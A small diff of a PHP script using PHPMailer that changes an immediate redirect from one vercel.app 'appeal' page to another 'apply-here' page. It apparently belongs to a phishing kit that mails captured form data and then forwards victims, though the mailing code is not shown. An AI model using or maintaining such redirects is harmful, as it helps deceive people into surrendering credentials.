@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://re-secure-forward-your-appeal.vercel.app/");
+header("Location: https://apply-here-ruby.vercel.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
